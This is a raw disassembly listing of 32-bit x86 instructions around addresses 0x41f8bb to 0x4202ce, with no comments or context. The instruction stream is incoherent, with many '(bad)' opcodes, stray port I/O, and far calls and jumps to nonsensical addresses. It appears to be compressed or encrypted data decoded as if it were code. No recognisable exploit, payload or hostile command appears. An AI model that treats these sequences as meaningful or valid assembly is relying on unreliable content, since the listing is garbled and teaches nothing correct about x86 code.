  41f8bb:	inc    esp
  41f8bc:	ins    BYTE PTR es:[edi],dx
  41f8bd:	sar    ebx,0x43
  41f8c0:	ja     0x41f8d3
  41f8c2:	bts    esp,ecx
  41f8c5:	jne    0x41f91d
  41f8c7:	sub    edi,DWORD PTR [edx+esi*2]
  41f8ca:	push   es
  41f8cb:	les    edi,FWORD PTR [esi-0x2f45ba4a]
  41f8d1:	aad    0xc
  41f8d3:	in     al,dx
  41f8d4:	jmp    0x41f931
  41f8d6:	inc    edi
  41f8d7:	clc    
  41f8d8:	xchg   esi,eax
  41f8d9:	adc    DWORD PTR [ecx+0x21611f8c],esp
  41f8df:	sub    edi,DWORD PTR [ebx]
  41f8e1:	mov    bl,0xba
  41f8e3:	inc    eax
  41f8e4:	inc    edi
  41f8e5:	mov    esi,0x1b09b61e
  41f8ea:	mov    al,0x54
  41f8ed:	in     al,0x0
	...
  41f953:	add    BYTE PTR [eax],al
  41f955:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	pop    ebp
  41f963:	repnz test al,0x49
  41f966:	addr16 push ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	std    
  41f96f:	pop    ds
  41f970:	and    al,0x25
  41f972:	outs   dx,BYTE PTR ds:[esi]
  41f973:	sar    BYTE PTR [esi],cl
  41f975:	aas    
  41f976:	in     eax,dx
  41f977:	xchg   ecx,eax
  41f978:	loopne 0x41f9c0
  41f97a:	test   eax,0x9d662d74
  41f97f:	in     al,0x3d
  41f981:	push   edx
  41f982:	jno    0x41f9b2
  41f984:	sbb    bl,BYTE PTR ds:0x6eb683a1
  41f98a:	popa   
  41f98b:	aad    0x62
  41f98d:	xchg   edx,eax
  41f98e:	push   esi
  41f98f:	(bad)  
  41f990:	mov    esi,0x9b7e806d
  41f995:	in     eax,0xf5
  41f997:	ja     0x41f9c4
  41f999:	jge    0x41f99d
  41f99b:	jp     0x41f954
  41f99d:	push   ebx
  41f99e:	mov    DWORD PTR [edi-0x78],esi
  41f9a1:	dec    eax
  41f9a2:	call   0xb85d7b6a
  41f9a7:	in     al,0xad
  41f9a9:	and    ch,ah
  41f9ab:	out    dx,al
  41f9ac:	fstp   QWORD PTR [edx]
  41f9ae:	and    ah,0xf
  41f9b1:	push   cs
  41f9b2:	cmp    eax,0x81e57619
  41f9b7:	imul   eax,eax,0xffffffa5
  41f9ba:	push   edi
  41f9bb:	int    0x64
  41f9bd:	push   ecx
  41f9be:	pop    es
  41f9bf:	jmp    0x57152ec4
  41f9c4:	cmp    BYTE PTR [esi+esi*1],cl
  41f9c7:	mov    eax,DWORD PTR [edi-0x4c8786df]
  41f9cd:	inc    esp
  41f9ce:	push   eax
  41f9cf:	adc    dl,ah
  41f9d1:	aad    0x18
  41f9d3:	iret   
  41f9d4:	outs   dx,DWORD PTR ds:[esi]
  41f9d5:	repnz dec edx
  41f9d7:	sub    dh,cl
  41f9d9:	pushf  
  41f9da:	adc    esp,esp
  41f9dc:	adc    ebx,DWORD PTR [ecx+0x77]
  41f9df:	stc    
  41f9e0:	cmp    BYTE PTR [esi-0x1d],bl
  41f9e3:	sbb    DWORD PTR [ebx],eax
  41f9e5:	out    dx,al
  41f9e6:	mov    bl,0x6c
  41f9e8:	cmp    BYTE PTR [ecx+0x6472a9ce],ah
  41f9ee:	das    
  41f9ef:	jmp    0x41f9e8
  41f9f1:	(bad)  
  41f9f2:	rcl    ah,cl
  41f9f4:	popf   
  41f9f5:	mov    al,0x5a
  41f9f7:	pop    es
  41f9f8:	outs   dx,BYTE PTR ds:[esi]
  41f9f9:	push   esp
  41f9fa:	std    
  41f9fb:	xlat   BYTE PTR ds:[ebx]
  41f9fc:	xlat   BYTE PTR ds:[ebx]
  41f9fd:	fnstcw WORD PTR [ebp+0x3d]
  41fa00:	dec    edx
  41fa01:	inc    edx
  41fa02:	inc    edx
  41fa03:	stc    
  41fa04:	call   0x7741:0xdb02c50f
  41fa0b:	push   es
  41fa0c:	sub    esi,DWORD PTR [ebp+0x70be06a0]
  41fa12:	mov    dl,0x73
  41fa14:	pop    ecx
  41fa15:	cmp    ecx,ebx
  41fa17:	xchg   ecx,eax
  41fa18:	push   0xfffffff9
  41fa1a:	push   DWORD PTR [eax-0x17a20063]
  41fa20:	mov    DWORD PTR [edx],ebp
  41fa22:	sbb    al,ch
  41fa24:	xchg   ebx,eax
  41fa25:	push   edi
  41fa26:	pop    ebp
  41fa27:	ins    BYTE PTR es:[edi],dx
  41fa28:	xor    ebx,ebp
  41fa2a:	js     0x41fa10
  41fa2c:	fdivr  QWORD PTR [ebx+0x3e]
  41fa2f:	jge    0x41fa70
  41fa31:	push   0x832c2b0b
  41fa36:	pop    ds
  41fa37:	add    eax,0x5269b8a7
  41fa3c:	(bad)  
  41fa3d:	std    
  41fa3e:	jo     0x41fa81
  41fa40:	cwde   
  41fa41:	mov    es,WORD PTR [esi+0x69252439]
  41fa47:	cli    
  41fa48:	or     BYTE PTR [edi-0x73d534fd],ch
  41fa4e:	mov    bl,0x9d
  41fa50:	sbb    al,0x62
  41fa52:	gs xchg ebx,eax
  41fa54:	and    al,al
  41fa56:	das    
  41fa57:	repz out dx,al
  41fa59:	sub    BYTE PTR [edi+ecx*8+0x6a],0x4
  41fa5e:	jmp    0xab63d03e
  41fa63:	out    0x13,eax
  41fa65:	jmp    0x4b37d213
  41fa6a:	dec    eax
  41fa6b:	int    0xb
  41fa6d:	aaa    
	...
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0xd0806f6e
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	add    ch,BYTE PTR [ecx+0x70]
  41faf1:	inc    edi
  41faf2:	dec    edi
  41faf3:	mov    esp,0xf06122d8
  41faf8:	pop    ecx
  41faf9:	pop    es
  41fafa:	mov    eax,0x3d6fcf79
  41faff:	pop    edx
  41fb00:	cmp    bl,bh
  41fb02:	lock push ebx
  41fb04:	push   0x505e3c4d
  41fb09:	cmp    dl,al
  41fb0b:	pushf  
  41fb0c:	(bad)  
  41fb0d:	das    
  41fb0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb0f:	into   
  41fb10:	out    0xf1,eax
  41fb12:	in     al,dx
  41fb13:	mov    ah,0x88
  41fb15:	push   ecx
  41fb16:	xor    bh,BYTE PTR [edx-0x7]
  41fb19:	outs   dx,BYTE PTR ds:[esi]
  41fb1a:	ss push cs
  41fb1c:	sbb    al,0x56
  41fb1e:	inc    ecx
  41fb1f:	les    eax,FWORD PTR ds:0xc1115008
  41fb25:	and    dl,dh
  41fb27:	mov    dl,BYTE PTR [eax+0x3a]
  41fb2a:	mov    dl,BYTE PTR [eax+0x690ef191]
  41fb30:	xchg   esi,eax
  41fb31:	cmp    bh,cl
  41fb33:	mov    eax,ds:0xb691fa21
  41fb38:	xor    eax,0xcf5ee6d0
  41fb3d:	mov    esi,DWORD PTR [eax+0x6e83876f]
  41fb43:	jecxz  0x41fb7c
  41fb45:	call   0x8196ade8
  41fb4a:	mov    ch,al
  41fb4c:	in     eax,0x2d
  41fb4e:	leave  
  41fb4f:	pop    ss
  41fb50:	mov    eax,0x47baffb7
  41fb55:	arpl   WORD PTR [esi+0x1f9337f8],di
  41fb5b:	xor    eax,0xfa66ec27
  41fb60:	lods   eax,DWORD PTR ds:[esi]
  41fb61:	or     bh,BYTE PTR ds:0x719ec7e6
  41fb67:	xchg   ebx,eax
  41fb68:	fidiv  WORD PTR [edx+eiz*1-0x2ef5e385]
  41fb6f:	loope  0x41faf7
  41fb71:	jg     0x41fb73
  41fb73:	aaa    
  41fb74:	jl     0x41fb55
  41fb76:	sbb    edi,esi
  41fb78:	inc    edi
  41fb79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb7a:	mov    ch,0xed
  41fb7c:	nop
  41fb7d:	sbb    al,0x43
  41fb7f:	and    BYTE PTR [ebx-0x48],dh
  41fb82:	fst    DWORD PTR [edx+0x42]
  41fb85:	adc    BYTE PTR [edi-0x3952e3eb],dh
  41fb8b:	push   0x28
  41fb8d:	dec    eax
  41fb8e:	push   edi
  41fb8f:	xor    edx,DWORD PTR [edi]
  41fb91:	not    DWORD PTR [esi]
  41fb93:	test   BYTE PTR ds:0x116e434d,bh
  41fb99:	inc    edi
  41fb9a:	ins    DWORD PTR es:[edi],dx
  41fb9b:	sahf   
  41fb9c:	or     DWORD PTR [esp-0x205daa0b],edx
  41fba3:	addr16 adc eax,0x903ba9a7
  41fba9:	les    eax,FWORD PTR [ecx+0x1b]
  41fbac:	mov    ecx,0xb59138d
  41fbb1:	push   edx
  41fbb2:	outs   dx,BYTE PTR ds:[esi]
  41fbb3:	xlat   BYTE PTR ds:[ebx]
  41fbb4:	inc    edi
  41fbb5:	frstor [ecx]
  41fbb7:	int    0x2f
  41fbb9:	xor    eax,0xc72f7242
  41fbbe:	inc    edx
  41fbbf:	and    eax,0xf7b3a24a
  41fbc4:	shl    BYTE PTR [edx],1
  41fbc6:	adc    DWORD PTR [ecx],ebx
  41fbc8:	cdq    
  41fbc9:	xor    al,0x9f
  41fbcb:	retf   
  41fbcc:	fmul   st,st(5)
  41fbce:	loopne 0x41fc35
  41fbd0:	sbb    BYTE PTR [ebp-0x23],bh
  41fbd3:	sti    
  41fbd4:	jp     0x41fc27
  41fbd6:	add    ecx,ecx
  41fbd8:	neg    BYTE PTR [edx+0x76e66a98]
  41fbde:	push   es
  41fbdf:	test   DWORD PTR [edi],esi
  41fbe1:	mov    BYTE PTR [esi-0x4d],dh
  41fbe4:	mov    cl,BYTE PTR [esp+edi*8+0x29e24662]
  41fbeb:	mov    es,WORD PTR ds:0x91
	...
  41fc55:	add    ah,bl
  41fc57:	sub    BYTE PTR [edx-0x119011c],cl
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	sbb    eax,0x67a2362a
  41fc67:	push   ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	inc    ebp
  41fc6f:	outs   dx,BYTE PTR gs:[esi]
  41fc71:	xchg   DWORD PTR [ebx-0x6c],eax
  41fc74:	in     eax,0x75
  41fc76:	xlat   BYTE PTR ds:[ebx]
  41fc77:	or     dl,BYTE PTR [edx]
  41fc79:	stos   BYTE PTR es:[edi],al
  41fc7a:	cmp    dl,BYTE PTR [edx+edx*2]
  41fc7d:	into   
  41fc7e:	inc    ebx
  41fc7f:	jle    0x41fc8d
  41fc81:	into   
  41fc82:	data16 aaa 
  41fc84:	jne    0x41fcb4
  41fc86:	dec    ecx
  41fc87:	jg     0x41fce4
  41fc89:	test   eax,0xd35e17f8
  41fc8e:	mov    cl,0xd5
  41fc90:	inc    ebx
  41fc91:	cmp    al,0xb8
  41fc93:	popa   
  41fc94:	xor    ebp,DWORD PTR [ecx+0x20c419e2]
  41fc9a:	int3   
  41fc9b:	icebp  
  41fc9c:	mov    esi,0xf38126b8
  41fca1:	add    ebx,DWORD PTR [ecx-0x5b3aca74]
  41fca7:	imul   ebx,DWORD PTR [ebp+0x74],0x1d
  41fcab:	adc    bl,BYTE PTR [eax+0xf]
  41fcae:	mov    ah,0xca
  41fcb0:	jns    0x41fc51
  41fcb2:	xlat   BYTE PTR ds:[ebx]
  41fcb3:	or     DWORD PTR [edi+0x7148e2cc],ebp
  41fcb9:	aaa    
  41fcba:	inc    esi
  41fcbb:	ds jnp 0x41fc8e
  41fcbe:	dec    edi
  41fcbf:	adc    eax,0xd2b12347
  41fcc4:	and    al,0xce
  41fcc6:	xchg   ecx,eax
  41fcc7:	push   eax
  41fcc8:	pop    ebx
  41fcc9:	mov    al,0x16
  41fccb:	out    0x80,al
  41fccd:	push   eax
  41fcce:	sub    esi,edx
  41fcd0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41fcd2:	push   esi
  41fcd3:	mov    edi,0x8c5041a0
  41fcd8:	pop    es
  41fcd9:	jmp    0x22956ea5
  41fcde:	addr16 cs sahf 
  41fce1:	jae    0x41fd29
  41fce3:	add    eax,0xf35b673e
  41fce8:	ds xchg ecx,eax
  41fcea:	sub    al,0xa9
  41fcec:	js     0x41fc98
  41fcee:	jne    0x41fd13
  41fcf0:	ins    BYTE PTR es:[edi],dx
  41fcf1:	je     0x41fca5
  41fcf3:	aas    
  41fcf4:	retf   
  41fcf5:	pop    ebx
  41fcf6:	(bad)  
  41fcf8:	lock repnz or ch,BYTE PTR [ebp-0x38]
  41fcfd:	lahf   
  41fcfe:	mov    BYTE PTR [edi-0x19],ah
  41fd01:	and    ecx,DWORD PTR ds:0xb52ebea3
  41fd07:	add    al,0xf5
  41fd09:	inc    edx
  41fd0a:	ins    BYTE PTR es:[edi],dx
  41fd0b:	mov    WORD PTR [ebp+eiz*1-0x6c],?
  41fd0f:	test   ch,bl
  41fd11:	ins    DWORD PTR es:[edi],dx
  41fd12:	adc    eax,0x4fa37708
  41fd17:	push   ebp
  41fd18:	call   0x76fc:0x2b3b8cfa
  41fd1f:	xchg   ecx,eax
  41fd20:	out    0xd8,eax
  41fd22:	xor    DWORD PTR ds:[ebx-0x65ee0b23],0xffffffa8
  41fd2a:	sub    al,0x12
  41fd2c:	in     eax,0x71
  41fd2e:	loope  0x41fcc8
  41fd30:	sbb    al,0x14
  41fd32:	and    ebx,DWORD PTR [edi+0x5f]
  41fd35:	into   
  41fd36:	mov    WORD PTR [ecx+0x692f03d6],ss
  41fd3c:	aas    
  41fd3d:	jecxz  0x41fd50
  41fd3f:	mov    edx,0x3a12c809
  41fd44:	jl     0x41fd1c
  41fd46:	mov    esi,0x6c49e92a
  41fd4b:	and    al,BYTE PTR [edx-0x70e6e4f6]
  41fd51:	sbb    edi,DWORD PTR [edx]
  41fd53:	xor    bh,al
  41fd55:	pop    ebp
  41fd56:	out    0x93,al
  41fd58:	and    eax,0x3c7b0fe7
  41fd5d:	pusha  
  41fd5e:	inc    edx
  41fd5f:	mov    ah,0xfc
  41fd61:	mov    ebp,eax
  41fd63:	push   ds
  41fd64:	loop   0x41fd2c
  41fd66:	jecxz  0x41fcee
  41fd68:	ret    
  41fd69:	dec    esp
  41fd6a:	aam    0x6
  41fd6c:	(bad)  
  41fd6d:	fadd   DWORD PTR [eax]
	...
  41fdd3:	add    BYTE PTR [eax],al
  41fdd5:	add    BYTE PTR [edx+ebp*2],cl
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	jmp    0x41fe4f
  41fde4:	retf   
  41fde5:	addr16 addr16 push esi
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	(bad)  
  41fdef:	scas   al,BYTE PTR es:[edi]
  41fdf0:	jo     0x41fdb3
  41fdf2:	mov    ds:0x28f7980d,al
  41fdf7:	sahf   
  41fdf8:	sub    eax,DWORD PTR [eax]
  41fdfa:	rcl    DWORD PTR [ebx],1
  41fdfc:	mov    esp,0x6cc1ce11
  41fe01:	push   0xefe9998b
  41fe06:	loop   0x41fde2
  41fe08:	imul   ecx,DWORD PTR [eax-0x63],0x3
  41fe0c:	mov    WORD PTR [esi+edi*4-0x91e1543],cs
  41fe13:	xchg   esp,eax
  41fe14:	arpl   WORD PTR [ebp-0x74b0911b],bp
  41fe1a:	sub    al,0x24
  41fe1c:	cli    
  41fe1d:	xchg   esi,eax
  41fe1e:	(bad)  
  41fe1f:	or     ch,BYTE PTR [eax+0x39203e22]
  41fe25:	push   ebp
  41fe26:	es dec edx
  41fe28:	not    ah
  41fe2a:	jmp    0x1fa5:0xfa182cbe
  41fe31:	cwde   
  41fe32:	push   cs
  41fe33:	mov    esp,0xe9f225d2
  41fe38:	scas   eax,DWORD PTR es:[edi]
  41fe39:	jmp    0x13572ba0
  41fe3e:	and    DWORD PTR [ecx+0x2539ce9d],esp
  41fe44:	in     al,dx
  41fe45:	int3   
  41fe46:	jge    0x41fead
  41fe48:	popa   
  41fe49:	mov    ds:0xdc2115c,al
  41fe4e:	icebp  
  41fe4f:	add    ebx,DWORD PTR [ebx]
  41fe51:	mov    ah,0x5a
  41fe53:	inc    edx
  41fe54:	es scas al,BYTE PTR es:[edi]
  41fe56:	enter  0xe072,0xff
  41fe5a:	int    0x33
  41fe5c:	and    ebp,DWORD PTR [edx+edi*2]
  41fe5f:	cmp    BYTE PTR [edi+0x26],0xc8
  41fe63:	out    dx,eax
  41fe64:	jg     0x41fe38
  41fe66:	sub    edi,edi
  41fe68:	imul   esi,DWORD PTR [edx-0xbf05a63],0xa6f1c4af
  41fe72:	add    eax,0x479dd8cb
  41fe77:	jecxz  0x41fe8c
  41fe79:	repnz mov DWORD PTR [bx+di],ebx
  41fe7d:	xchg   edx,eax
  41fe7e:	jae    0x41febc
  41fe80:	popf   
  41fe81:	cdq    
  41fe82:	outs   dx,BYTE PTR ds:[esi]
  41fe83:	rcl    DWORD PTR [edi+0x5e],1
  41fe86:	fisub  DWORD PTR [edx-0x70]
  41fe89:	stos   BYTE PTR es:[edi],al
  41fe8a:	ins    BYTE PTR es:[edi],dx
  41fe8b:	in     eax,0xf3
  41fe8d:	or     esi,edi
  41fe8f:	jno    0x41feda
  41fe91:	and    DWORD PTR [edx+0x31368d73],0x359e9aca
  41fe9b:	je     0x41febb
  41fe9d:	jp     0x41ff11
  41fe9f:	jecxz  0x41ff03
  41fea1:	push   esp
  41fea2:	dec    edi
  41fea3:	sbb    DWORD PTR [ecx],esi
  41fea5:	jmp    0x426e4b89
  41feaa:	cmc    
  41feab:	les    ebx,FWORD PTR [esi]
  41fead:	mov    ecx,0x136847d3
  41feb2:	adc    al,0x47
  41feb4:	or     bl,bh
  41feb6:	push   cs
  41feb7:	jmp    FWORD PTR [edi]
  41feb9:	xchg   bh,bl
  41febb:	es pop eax
  41febd:	adc    bl,al
  41febf:	mov    ah,0xba
  41fec1:	scas   eax,DWORD PTR es:[edi]
  41fec2:	and    al,BYTE PTR ds:0xac1f7db0
  41fec8:	mov    esi,0xe6e625a6
  41fecd:	call   0x86e3c579
  41fed2:	or     DWORD PTR [edi-0x42],esp
  41fed5:	dec    eax
  41fed6:	sub    DWORD PTR [edx],esp
  41fed8:	pop    edi
  41fed9:	cmp    ah,ah
  41fedb:	push   edi
  41fedc:	pop    ds
  41fedd:	pop    edx
  41fede:	sub    ecx,ebp
  41fee0:	inc    edi
  41fee1:	loope  0x41feb0
  41fee3:	ins    DWORD PTR es:[edi],dx
  41fee4:	(bad)  
  41fee5:	imul   ebx,ebp,0x1e
  41fee8:	cmp    BYTE PTR [ebx],dh
  41feea:	pop    esi
  41feeb:	mov    BYTE PTR [ebx-0x65],ch
	...
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x49
  41ff63:	or     esp,DWORD PTR [ebx]
  41ff65:	mov    al,0x67
  41ff67:	push   edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	fcomp  QWORD PTR [edx+0x6d]
  41ff71:	xor    eax,0xcac71f7e
  41ff76:	out    0x4e,al
  41ff78:	mov    ds:0x909cd94d,eax
  41ff7d:	test   BYTE PTR [edi+0x43316483],dh
  41ff83:	add    al,0x68
  41ff85:	mov    DWORD PTR [ebp-0x4c81b306],ebx
  41ff8b:	fstp   TBYTE PTR [esi]
  41ff8d:	std    
  41ff8e:	ror    bl,cl
  41ff90:	jg     0x41ffea
  41ff92:	cwde   
  41ff93:	stc    
  41ff94:	outs   dx,BYTE PTR ds:[esi]
  41ff95:	adc    al,0x6e
  41ff97:	and    BYTE PTR ds:0x1fe29aa1,ah
  41ff9d:	hlt    
  41ff9e:	add    eax,0x9177136f
  41ffa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffa4:	lea    ebp,[ebp+edi*2+0x69c01d2d]
  41ffab:	or     BYTE PTR [edi-0x2a83cd8b],0xb0
  41ffb2:	in     eax,dx
  41ffb3:	cdq    
  41ffb4:	mov    al,ds:0x8d3814a6
  41ffb9:	add    eax,0x212e00be
  41ffbe:	imul   ebp,edi,0xffffffea
  41ffc1:	pop    ss
  41ffc2:	push   esi
  41ffc3:	fnstsw WORD PTR [edi]
  41ffc5:	ds enter 0x36d4,0xa6
  41ffca:	mov    ch,0xa9
  41ffcc:	ror    edi,0xc8
  41ffcf:	in     eax,dx
  41ffd0:	jecxz  0x41ffb4
  41ffd2:	pop    eax
  41ffd3:	cmp    eax,0x2fd45047
  41ffd8:	in     eax,0xa3
  41ffda:	popa   
  41ffdb:	cld    
  41ffdc:	ss and al,0x38
  41ffdf:	es loope 0x420028
  41ffe2:	ss loope 0x42001d
  41ffe5:	sub    eax,0x2c5fdbc4
  41ffea:	push   ebx
  41ffeb:	sbb    BYTE PTR [eax+0x39],al
  41ffee:	jmp    0x420008
  41fff0:	sar    DWORD PTR [edi+0x50],cl
  41fff3:	mov    esp,0xc1fe4f69
  41fff8:	or     BYTE PTR [eax+eiz*2-0x31753ac0],ch
  41ffff:	inc    edx
  420000:	push   0x7a1b4a6b
  420005:	and    eax,DWORD PTR [ecx-0x7a]
  420008:	cli    
  420009:	outs   dx,DWORD PTR ds:[esi]
  42000a:	mov    al,0xb6
  42000c:	mov    ebp,0x39603f43
  420011:	retf   
  420012:	mov    ebx,0x1e217d8f
  420017:	in     al,0xfc
  420019:	xor    eax,0xb02b355
  42001e:	adc    esi,DWORD PTR [esi]
  420020:	iret   
  420021:	fwait
  420022:	mov    dh,BYTE PTR [ebp-0x3b467052]
  420028:	cld    
  420029:	in     al,0xe0
  42002b:	sbb    al,0x29
  42002d:	adc    al,0xba
  42002f:	jg     0x420040
  420031:	jnp    0x420036
  420033:	add    BYTE PTR [ebp+0x2f000ab7],ah
  420039:	mov    ds:0xa25b40fd,eax
  42003e:	cdq    
  42003f:	jnp    0x4200b3
  420041:	in     eax,0xef
  420043:	cwde   
  420044:	scas   eax,DWORD PTR es:[edi]
  420045:	retf   0x32d0
  420048:	adc    eax,DWORD PTR ds:0xcb37da2a
  42004e:	arpl   WORD PTR [ebx+0x72e4a22f],dx
  420054:	es fwait
  420056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420057:	imul   edx,DWORD PTR [ecx],0xbae8a8bb
  42005d:	push   ds
  42005e:	fbstp  TBYTE PTR [ecx]
  420060:	fidiv  WORD PTR [ebx+0x79]
  420063:	sbb    eax,0x1ffe7efc
  420068:	xor    cl,BYTE PTR [ecx]
  42006a:	cld    
  42006b:	pop    ds
  42006c:	add    DWORD PTR [eax+eax*1+0x0],0x0
	...
  4200d3:	add    BYTE PTR [eax],al
  4200d5:	add    BYTE PTR [edx-0x5b],ah
  4200d8:	jbe    0x420159
  4200da:	idiv   edi
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffed
  4200e3:	pop    edi
  4200e4:	push   0xffffffe5
  4200e6:	addr16 pop eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	pop    eax
  4200ef:	cmc    
  4200f0:	ss xor al,0x2e
  4200f3:	movlps QWORD PTR [ebp+0x1e6fcde5],xmm4
  4200fa:	pop    edx
  4200fb:	and    eax,DWORD PTR [edi-0x640c94b6]
  420101:	mov    dl,0x1d
  420103:	cli    
  420104:	pop    ecx
  420105:	push   ecx
  420106:	ret    
  420107:	in     eax,dx
  420108:	data16 aas 
  42010a:	(bad)  
  42010b:	xchg   esi,eax
  42010c:	inc    eax
  42010d:	push   0xffffffd9
  42010f:	addr16 push 0xd3bf96cf
  420115:	out    0xd6,al
  420117:	push   edx
  420118:	mov    bl,BYTE PTR [ebx-0xafffd76]
  42011e:	enter  0x7e20,0x6d
  420122:	adc    ecx,esp
  420124:	xlat   BYTE PTR ds:[ebx]
  420125:	jnp    0x4200b5
  420127:	xchg   esi,eax
  420128:	js     0x420199
  42012a:	call   0x4aed40e2
  42012f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420130:	mov    ecx,es
  420132:	ret    0x482f
  420135:	xchg   esp,eax
  420136:	or     dl,BYTE PTR [ebx+0x7d2bd541]
  42013c:	dec    esp
  42013d:	jmp    0x420131
  42013f:	hlt    
  420140:	out    0xab,al
  420142:	xor    eax,0x99d84162
  420147:	call   0xfe35cb90
  42014c:	sbb    al,0x70
  42014e:	das    
  42014f:	pop    esi
  420150:	ins    BYTE PTR es:[edi],dx
  420151:	cmp    BYTE PTR [esi-0xe522bed],bl
  420157:	test   al,0xd1
  420159:	pop    edi
  42015a:	sub    al,cl
  42015c:	daa    
  42015d:	mov    esp,0x10bcb48f
  420162:	add    BYTE PTR [edx+0x1934766b],0x6c
  420169:	mov    WORD PTR [esi-0x384bd796],ss
  42016f:	ja     0x420124
  420171:	cmp    ah,bh
  420173:	hlt    
  420174:	das    
  420175:	jae    0x420178
  420177:	xchg   esp,eax
  420178:	cli    
  420179:	lea    edx,[ebx+ebp*8-0x69af415b]
  420180:	or     ecx,DWORD PTR [edi+0x7984c009]
  420186:	or     ebp,DWORD PTR [ebp+0x1d]
  420189:	cdq    
  42018a:	outs   dx,BYTE PTR ds:[esi]
  42018b:	cwde   
  42018c:	leave  
  42018d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42018e:	sbb    edx,DWORD PTR [esi]
  420190:	mov    edx,0x12bc0c32
  420195:	xchg   ebp,eax
  420196:	jnp    0x420161
  420198:	out    0x21,al
  42019a:	or     BYTE PTR [ebx-0x66],ch
  42019d:	cmp    al,0x48
  42019f:	or     DWORD PTR [edx],esp
  4201a1:	xchg   edi,eax
  4201a2:	(bad)  
  4201a3:	fidivr WORD PTR [edx]
  4201a5:	jne    0x4201d3
  4201a7:	add    al,0xe6
  4201a9:	aam    0x46
  4201ab:	mov    ?,WORD PTR [ecx]
  4201ad:	cwde   
  4201ae:	mov    bl,0x84
  4201b0:	pusha  
  4201b1:	leave  
  4201b2:	(bad)  [eax+0x50b39933]
  4201b8:	and    esp,eax
  4201ba:	xchg   esp,eax
  4201bb:	jno    0x420211
  4201bd:	add    eax,0x33836532
  4201c2:	add    dh,BYTE PTR [ebx-0x4f]
  4201c5:	stos   DWORD PTR es:[edi],eax
  4201c6:	push   eax
  4201c7:	imul   ebx,DWORD PTR [ebx-0x64],0xee493b76
  4201ce:	dec    edx
  4201cf:	in     eax,0xbc
  4201d1:	lahf   
  4201d2:	push   es
  4201d3:	mov    cl,cl
  4201d5:	test   eax,0x2dafac3f
  4201da:	das    
  4201db:	inc    ebp
  4201dc:	aas    
  4201dd:	push   ebp
  4201de:	inc    edi
  4201df:	adc    BYTE PTR [ecx+0x251d2892],0x6a
  4201e6:	call   DWORD PTR [eax-0x45]
  4201e9:	mov    ?,edi
  4201eb:	daa    
  4201ec:	or     DWORD PTR [esi+0x0],0x0
	...
  420253:	add    BYTE PTR [eax],al
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0x2bc479be],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	fdivr  st(6),st
  420270:	pop    esp
  420271:	(bad)  
  420272:	sti    
  420273:	cdq    
  420274:	mov    esi,0xc93ea151
  420279:	push   ds
  42027a:	mov    bl,0x7e
  42027c:	push   esp
  42027d:	stos   DWORD PTR es:[edi],eax
  42027e:	push   esi
  42027f:	xor    DWORD PTR [edi-0xc2bfce6],esp
  420285:	arpl   WORD PTR [ebx],si
  420287:	mov    bl,0x40
  420289:	add    ebx,eax
  42028b:	xchg   WORD PTR [edi-0x111bad46],cx
  420292:	icebp  
  420293:	dec    BYTE PTR [edi+0x76]
  420296:	gs xor dl,bl
  420299:	cld    
  42029a:	aad    0xfb
  42029c:	inc    eax
  42029d:	mov    ah,BYTE PTR [esi+0x72]
  4202a0:	push   edx
  4202a1:	add    BYTE PTR [ebp+0x4b],dh
  4202a4:	lods   al,BYTE PTR ds:[esi]
  4202a5:	cmp    ax,0xee6d
  4202a9:	sbb    al,0x5b
  4202ab:	sbb    eax,DWORD PTR [edi]
  4202ad:	(bad)  
  4202ae:	lds    ebx,FWORD PTR [eax-0x31]
  4202b1:	xor    ah,dl
  4202b3:	ins    BYTE PTR es:[edi],dx
  4202b4:	and    ebp,DWORD PTR [esp+eax*1+0x18]
  4202b8:	jle    0x4202f3
  4202ba:	mov    ecx,0x4a38f4f5
  4202bf:	nop
  4202c0:	sbb    eax,0x9520aa32
  4202c5:	aaa    
  4202c6:	ret    0xe58a
  4202c9:	imul   esp,ebx,0xffffffc5
  4202cc:	test   BYTE PTR [ebx],al
  4202ce:	cmp    esi,DWORD PTR [ebp-0x17]
